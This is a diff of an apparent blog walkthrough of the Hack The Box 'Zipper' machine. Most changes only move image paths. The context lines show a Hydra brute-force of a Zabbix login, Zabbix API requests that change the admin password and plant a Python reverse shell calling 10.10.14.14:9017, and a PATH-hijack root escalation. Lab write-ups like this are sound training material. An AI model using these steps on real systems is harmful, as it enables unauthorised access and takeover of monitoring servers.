@@ -5,7 +5,7 @@
     
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="revised" content="2019-02-23T14:11:03 EST">
+<meta name="revised" content="2019-02-23T14:13:25 EST">
 <title>Zipper :: DocDock Documentation</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
@@ -588,9 +588,9 @@ Zabbix Server - Multiple Vulnerabilities                            | exploits/m
 
 <p>WEBAPP</p>
 
-<p><img src="https://chickenpwny.github.io/images/https://chickenpwny.github.io/images/web-app.PNG" alt="web-app" /></p>
+<p><img src="https://chickenpwny.github.io/images/zipper/web-app.PNG" alt="web-app" /></p>
 
-<p><img src="https://chickenpwny.github.io/images/web-version.PNG" alt="web-version" /></p>
+<p><img src="https://chickenpwny.github.io/images/zipper/web-version.PNG" alt="web-version" /></p>
 
 <p>So apartently getting a users credentials isn&rsquo;t nessisary to get what i need but i dont have creds but i have access to guest account which will give me access to whatever is need to get rce.</p>
 
@@ -611,7 +611,7 @@ import readline
 
 </code></pre>
 
-<p>BURP<img src="https://chickenpwny.github.io/images/sql-fail'.PNG" alt="sql-fail'" /></p>
+<p>BURP<img src="https://chickenpwny.github.io/images/zipper/sql-fail'.PNG" alt="sql-fail'" /></p>
 
 <p>HYDRA</p>
 
@@ -628,7 +628,7 @@ form-post &quot;/zabbix/index.php:name=^USER^&amp;password=^PASS^&amp;autologin=
 me or password is incorrect.&quot; -I
 </code></pre>
 
-<p><img src="https://chickenpwny.github.io/images/zipper-zapper.PNG" alt="zipper-zapper" /></p>
+<p><img src="https://chickenpwny.github.io/images/zipper/zipper-zapper.PNG" alt="zipper-zapper" /></p>
 
 <p>Reviewing 33937.py</p>
 
@@ -728,9 +728,9 @@ while True:
 	if cmd == &quot;quit&quot; : break
 </code></pre>
 
-<p><img src="https://chickenpwny.github.io/images/edit-poc-rce-shell.PNG" alt="edit-poc-rce-shell" /></p>
+<p><img src="https://chickenpwny.github.io/images/zipper/edit-poc-rce-shell.PNG" alt="edit-poc-rce-shell" /></p>
 
-<p><img src="https://chickenpwny.github.io/images/ping-zabbix-rce.PNG" alt="ping-zabbix-rce" /></p>
+<p><img src="https://chickenpwny.github.io/images/zipper/ping-zabbix-rce.PNG" alt="ping-zabbix-rce" /></p>
 
 <p>To get a reverse shell i just used</p>
 
@@ -800,7 +800,7 @@ ERROR 1045 (28000): Access denied for user 'Zapper'@'localhost' (using password:
 <pre><code>{&quot;jsonrpc&quot;: &quot;2.0&quot;, &quot;method&quot;: &quot;user.login&quot;, &quot;params&quot;: {&quot;user&quot;:&quot;Zapper&quot;,&quot;password&quot;:&quot;zapper&quot;, &quot;userData&quot;:true},&quot;id&quot;: 1}
 </code></pre>
 
-<p><img src="https://chickenpwny.github.io/images/api-login2.PNG" alt="api-login2" /></p>
+<p><img src="https://chickenpwny.github.io/images/zipper/api-login2.PNG" alt="api-login2" /></p>
 
 <p>USER.GET</p>
 
@@ -814,7 +814,7 @@ ERROR 1045 (28000): Access denied for user 'Zapper'@'localhost' (using password:
 <pre><code>{&quot;jsonrpc&quot;: &quot;2.0&quot;, &quot;method&quot;: &quot;user.get&quot;, &quot;params&quot; : {&quot;output&quot;:&quot;extend&quot;}, &quot;auth&quot;:&quot;cf59b1d9c2addcf06b7630b3730e3d8c&quot;, &quot;id&quot;: 1}
 </code></pre>
 
-<p><img src="https://chickenpwny.github.io/images/api-login-user-get.PNG" alt="api-login-user-get" /></p>
+<p><img src="https://chickenpwny.github.io/images/zipper/api-login-user-get.PNG" alt="api-login-user-get" /></p>
 
 <p>UPDATE SCRIPT</p>
 
@@ -831,7 +831,7 @@ ERROR 1045 (28000): Access denied for user 'Zapper'@'localhost' (using password:
 &quot;scriptid&quot;: &quot;1&quot;, &quot;command&quot;: &quot;/usr/bin/python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.14&quot;,9017));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'&quot;, &quot;execute_on&quot;: &quot;1&quot;}, &quot;auth&quot;: &quot;7218f7f45344ee78c2f4c6336d715797&quot; , &quot;id&quot;: 0}
 </code></pre>
 
-<p><img src="https://chickenpwny.github.io/images/api-login3.PNG" alt="api-login3" /></p>
+<p><img src="https://chickenpwny.github.io/images/zipper/api-login3.PNG" alt="api-login3" /></p>
 
 <p>HOSTGROUP.GET       <a href="https://www.zabbix.com/documentation/3.0/manual/api/reference/hostgroup/get">https://www.zabbix.com/documentation/3.0/manual/api/reference/hostgroup/get</a></p>
 
@@ -842,18 +842,18 @@ ERROR 1045 (28000): Access denied for user 'Zapper'@'localhost' (using password:
 {&quot;groupid&quot;:&quot;4&quot;,&quot;name&quot;:&quot;Zabbix servers&quot;,&quot;internal&quot;:&quot;0&quot;,&quot;flags&quot;:&quot;0&quot;}]
 </code></pre>
 
-<p><img src="https://chickenpwny.github.io/images/hostgroup.PNG" alt="hostgroup" /></p>
+<p><img src="https://chickenpwny.github.io/images/zipper/hostgroup.PNG" alt="hostgroup" /></p>
 
 <p>EXECUTE SCRIPT</p>
 
 <p>there are two scripts 1 &amp; 2. 1 is ping host,conn which pings the localhost, 2 does a traceroute</p>
 
-<p><img src="https://chickenpwny.github.io/images/api-login-execute-script-2.PNG" alt="api-login-execute-script-2" /></p>
+<p><img src="https://chickenpwny.github.io/images/zipper/api-login-execute-script-2.PNG" alt="api-login-execute-script-2" /></p>
 
 <pre><code>{&quot;jsonrpc&quot;: &quot;2.0&quot;, &quot;method&quot;: &quot;script.execute&quot;, &quot;params&quot;: {&quot;scriptid&quot;: &quot;1&quot;, &quot;hostid&quot;: &quot;10106&quot;}, &quot;auth&quot;: &quot;f75aed6a9bf98e7b3057e61e13680eb1&quot; , &quot;id&quot;: 3}
 </code></pre>
 
-<p><img src="https://chickenpwny.github.io/images/api-login-execute-script.PNG" alt="api-login-execute-script" /></p>
+<p><img src="https://chickenpwny.github.io/images/zipper/api-login-execute-script.PNG" alt="api-login-execute-script" /></p>
 
 <p>Update user</p>
 
@@ -867,25 +867,25 @@ ERROR 1045 (28000): Access denied for user 'Zapper'@'localhost' (using password:
 <pre><code>{&quot;jsonrpc&quot;: &quot;2.0&quot;, &quot;method&quot;: &quot;user.updateprofile&quot;, &quot;params&quot; : {&quot;gui_access&quot; : &quot;0&quot;} ,&quot;auth&quot;:&quot;965527f25c3ccfb94a0aac0045a08ae1&quot;, &quot;id&quot;: 1}
 </code></pre>
 
-<p><img src="https://chickenpwny.github.io/images/api-login-update-current-user.PNG" alt="api-login-update-current-user" /></p>
+<p><img src="https://chickenpwny.github.io/images/zipper/api-login-update-current-user.PNG" alt="api-login-update-current-user" /></p>
 
 <p>Managed to change Zapper alias to chicken</p>
 
 <pre><code>{&quot;jsonrpc&quot;: &quot;2.0&quot;, &quot;method&quot;: &quot;user.updateprofile&quot;, &quot;params&quot; : {&quot;alias&quot;:&quot;chicken&quot;} ,&quot;auth&quot;:&quot;fe104ec22e55d13c8e86cb66c93dc6f6&quot;, &quot;id&quot;: 1}
 </code></pre>
 
-<p><img src="https://chickenpwny.github.io/images/api-login-update-current-user-change-passwd.PNG" alt="api-login-update-current-user-change-passwd" /></p>
+<p><img src="https://chickenpwny.github.io/images/zipper/api-login-update-current-user-change-passwd.PNG" alt="api-login-update-current-user-change-passwd" /></p>
 
 <p>Changing Admin password, changed it to chickenpwny lol. See the abose to see how i got the information to confirm this part.</p>
 
-<p><img src="https://chickenpwny.github.io/images/api-login-Admin.PNG" alt="api-login-Admin" /></p>
+<p><img src="https://chickenpwny.github.io/images/zipper/api-login-Admin.PNG" alt="api-login-Admin" /></p>
 
 <p>GetScripts</p>
 
 <pre><code>{&quot;jsonrpc&quot;: &quot;2.0&quot;, &quot;method&quot;: &quot;script.getscriptsbyhosts&quot;, &quot;params&quot;: [10106], &quot;auth&quot; : &quot;a13a74e204be089da0a4bff711cad266&quot;, &quot;id&quot;:1}
 </code></pre>
 
-<p><img src="https://chickenpwny.github.io/images/api-login-get-scripts.PNG" alt="api-login-get-scripts" /></p>
+<p><img src="https://chickenpwny.github.io/images/zipper/api-login-get-scripts.PNG" alt="api-login-get-scripts" /></p>
 
 <pre><code>{&quot;jsonrpc&quot;: &quot;2.0&quot;, &quot;method&quot;: &quot;script.get&quot;, &quot;params&quot;: {&quot;output&quot;:&quot;extend&quot;}, &quot;auth&quot; : &quot;2cd9441052c1eab4d63885c825766154&quot;, &quot;id&quot;:1}
 </code></pre>
@@ -909,7 +909,7 @@ ERROR 1045 (28000): Access denied for user 'Zapper'@'localhost' (using password:
 <pre><code>{&quot;usrgrpid&quot;:&quot;7&quot;,&quot;name&quot;:&quot;Zabbix administrators&quot;,&quot;gui_access&quot;:&quot;0&quot;,&quot;users_status&quot;:&quot;0&quot;,&quot;debug_mode&quot;:&quot;0&quot;},{&quot;usrgrpid&quot;:&quot;8&quot;,&quot;name&quot;:&quot;Guests&quot;,&quot;gui_access&quot;:&quot;0&quot;,&quot;users_status&quot;:&quot;0&quot;,&quot;debug_mode&quot;:&quot;0&quot;},{&quot;usrgrpid&quot;:&quot;9&quot;,&quot;name&quot;:&quot;Disabled&quot;,&quot;gui_access&quot;:&quot;0&quot;,&quot;users_status&quot;:&quot;1&quot;,&quot;debug_mode&quot;:&quot;0&quot;},{&quot;usrgrpid&quot;:&quot;11&quot;,&quot;name&quot;:&quot;Enabled debug mode&quot;,&quot;gui_access&quot;:&quot;0&quot;,&quot;users_status&quot;:&quot;0&quot;,&quot;debug_mode&quot;:&quot;1&quot;},{&quot;usrgrpid&quot;:&quot;12&quot;,&quot;name&quot;:&quot;No access to the frontend&quot;,&quot;gui_access&quot;:&quot;2&quot;,&quot;users_status&quot;:&quot;0&quot;,&quot;debug_mode&quot;:&quot;0&quot;}
 </code></pre>
 
-<p><img src="https://chickenpwny.github.io/images/api-login-user-get.PNG" alt="api-login-user-get" /></p>
+<p><img src="https://chickenpwny.github.io/images/zipper/api-login-user-get.PNG" alt="api-login-user-get" /></p>
 
 <p>USERGROUP.UPDATE</p>
 
@@ -918,11 +918,11 @@ ERROR 1045 (28000): Access denied for user 'Zapper'@'localhost' (using password:
 <pre><code>{&quot;jsonrpc&quot;: &quot;2.0&quot;, &quot;method&quot;: &quot;usergroup.update&quot;, &quot;params&quot;: {&quot;usrgrpid&quot;:&quot;12&quot;, &quot;gui_access&quot;:&quot;0&quot;}, &quot;auth&quot;:&quot;76ae2a3721c502c6bbf18b51185b6e37&quot;,&quot;id&quot;: 1}
 </code></pre>
 
-<p><img src="https://chickenpwny.github.io/images/CHANGE-GUI.PNG" alt="loCHANGE-GUI" /></p>
+<p><img src="https://chickenpwny.github.io/images/zipper/CHANGE-GUI.PNG" alt="loCHANGE-GUI" /></p>
 
 <p>the multiple cookies are from me messing with the cookies using an addon lol</p>
 
-<p><img src="https://chickenpwny.github.io/images/CHANGE-GUI-2.PNG" alt="CHANGE-GUI-2" /></p>
+<p><img src="https://chickenpwny.github.io/images/zipper/CHANGE-GUI-2.PNG" alt="CHANGE-GUI-2" /></p>
 
 <p>INTERFACE.get</p>
 
@@ -937,9 +937,9 @@ ERROR 1045 (28000): Access denied for user 'Zapper'@'localhost' (using password:
 
 <p>You can also get a shell using the webportal. change execute on to zabbix server.</p>
 
-<p><img src="https://chickenpwny.github.io/images/web-app-admin.PNG" alt="web-app-admin" /></p>
+<p><img src="https://chickenpwny.github.io/images/zipper/web-app-admin.PNG" alt="web-app-admin" /></p>
 
-<p><img src="https://chickenpwny.github.io/images/web-app-admin-2.PNG" alt="web-app-admin-2" /></p>
+<p><img src="https://chickenpwny.github.io/images/zipper/web-app-admin-2.PNG" alt="web-app-admin-2" /></p>
 
 <p>PYTHON</p>
 
@@ -1060,13 +1060,13 @@ while True:
 
 <p>You may also change zappers privledges but this is much simpler. should be above somewhere.</p>
 
-<p><img src="https://chickenpwny.github.io/images/final-login.PNG" alt="final-login" /></p>
+<p><img src="https://chickenpwny.github.io/images/zipper/final-login.PNG" alt="final-login" /></p>
 
-<p><img src="https://chickenpwny.github.io/images/final-login-2.PNG" alt="final-login-2" /></p>
+<p><img src="https://chickenpwny.github.io/images/zipper/final-login-2.PNG" alt="final-login-2" /></p>
 
-<p><img src="https://chickenpwny.github.io/images/final-login-3.PNG" alt="final-login-3" /></p>
+<p><img src="https://chickenpwny.github.io/images/zipper/final-login-3.PNG" alt="final-login-3" /></p>
 
-<p><img src="https://chickenpwny.github.io/images/final-login-4.PNG" alt="final-login-4" /></p>
+<p><img src="https://chickenpwny.github.io/images/zipper/final-login-4.PNG" alt="final-login-4" /></p>
 
 <p>PYTHON3</p>
 
@@ -1082,7 +1082,7 @@ while True:
 
 <p>SU ZAPPER COPY PASTE THE PASSWORD FROM THE FILE IT HAS A SPECIAL CHARACTER</p>
 
-<p><img src="https://chickenpwny.github.io/images/zapper.PNG" alt="zapper" /></p>
+<p><img src="https://chickenpwny.github.io/images/zipper/zapper.PNG" alt="zapper" /></p>
 
 <h2 id="root">ROOT</h2>
 
@@ -1100,9 +1100,9 @@ ssh zapper@10.10.10.108 -i id_rsa
 
 <h4 id="ltrace">LTRACE</h4>
 
-<p><img src="https://chickenpwny.github.io/images/ltrace.PNG" alt="ltrace" /></p>
+<p><img src="https://chickenpwny.github.io/images/zipper/ltrace.PNG" alt="ltrace" /></p>
 
-<p><img src="https://chickenpwny.github.io/images/strings.PNG" alt="strings" /></p>
+<p><img src="https://chickenpwny.github.io/images/zipper/strings.PNG" alt="strings" /></p>
 
 <pre><code>cd /home/zapper/utils
 echo &quot;/bin/bash&quot; &gt; systemctl
@@ -1112,7 +1112,7 @@ export PATH=/home/zapper/utils:$PATH
 ./zabbix-service
 </code></pre>
 
-<p><img src="https://chickenpwny.github.io/images/root.PNG" alt="root" /></p>
+<p><img src="https://chickenpwny.github.io/images/zipper/root.PNG" alt="root" /></p>
 
 <p>clean up the path changes be careful chaning this</p>
 
